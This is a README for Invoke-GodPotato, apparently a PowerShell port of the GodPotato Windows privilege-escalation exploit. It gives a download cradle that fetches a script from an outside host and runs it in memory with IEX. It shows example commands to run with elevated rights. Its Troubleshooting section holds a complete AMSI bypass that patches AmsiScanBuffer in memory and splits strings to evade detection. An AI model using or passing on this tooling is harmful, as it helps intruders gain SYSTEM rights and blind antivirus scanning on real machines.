# Invoke-GodPotato
## Foreword
Highly inspirated by 
- https://github.com/S3cur3Th1sSh1t/PowerSharpPack/blob/master/PowerSharpBinaries/Invoke-BadPotato.ps1
- https://github.com/BeichenDream/GodPotato/tree/main
 
<br />

## Basic Usage
First of all, you have to load the powershell script into memory. You can do that however you want. Here are two examples:
```powershell
# Load into memory remotely from webserver
(New-Object Net.WebClient).DownloadString('http://192.168.1.1/Invoke-GodPotato.ps1') | IEX

# Load into memory from local file
. .\Invoke-GodPotato.ps1
```
Now you can execute commands using cmd.exe or powershell.
```powershell
Invoke-GodPotato "cmd /c whoami"
Invoke-GodPotato "powershell -enc dwBoAG8AYQBtAGkA"
```

<br />

## Troubleshooting
Dont rage if you get an error like:
```powershell
Invoke-GodPotato : The term 'Invoke-GodPotato' is not recognized as the name of a cmdlet, function, script file, or
operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try
again.
At line:1 char:1
+ Invoke-GodPotato
+ ~~~~~~~~~~~~~~~~
    + CategoryInfo          : ObjectNotFound: (Invoke-GodPotato:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
```

<br />

This is simply an AMSI-Problem and you have to bypass it **correctly**. Read more at https://s3cur3th1ssh1t.github.io/Powershell-and-the-.NET-AMSI-Interface/. Basically, you just have to patch 
your current powershell process with:
```powershell
$Win32 = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```
